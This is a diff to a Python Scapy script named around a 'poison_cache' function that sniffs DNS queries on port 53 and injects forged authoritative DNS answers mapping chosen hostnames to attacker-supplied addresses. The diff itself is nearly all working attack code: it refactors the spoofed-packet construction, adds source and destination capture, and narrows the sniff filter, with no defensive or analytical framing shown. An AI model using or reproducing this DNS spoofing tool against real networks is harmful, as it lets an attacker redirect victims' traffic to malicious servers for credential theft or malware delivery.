@@ -12,10 +12,10 @@ def poison_cache(pkt):
     global interface
     global hostnames_specified
     global addr
-    #if pkt.haslayer(DNS):
-        #if pkt.getlayer(DNS).qr == 0 and pkt.getlayer(DNS).qd.qtype == 1:
     if IP in pkt:
-        if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:        
+        ip_src = pkt[IP].src
+        ip_dst = pkt[IP].dst
+        if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:       
             query = pkt[DNS].qd
             pkt[UDP].chksum = None
             print("queryname: "+ str(query.qname))
@@ -30,9 +30,7 @@ def poison_cache(pkt):
                 print("Preparing spoofed packet")
             else:
                 poison_addr = addr
-            inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
+            inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
             send(inject_packet, iface=interface)
             print('Sent:', inject_packet.summary())
 
@@ -58,7 +56,7 @@ def main():
             dns_holder[ip_host[1].strip() + "."] = str(ip_host[0]).strip()
     print("Poison Map: " + str(dns_holder))
     print("Sniffing on packets on interface: "+ str(interface))
-    sniff(iface = interface, prn = poison_cache, store = 0)
+    sniff(iface = interface,filter = 'port 53', prn = poison_cache, store = 0)
 if __name__ == "__main__":
     main()
 
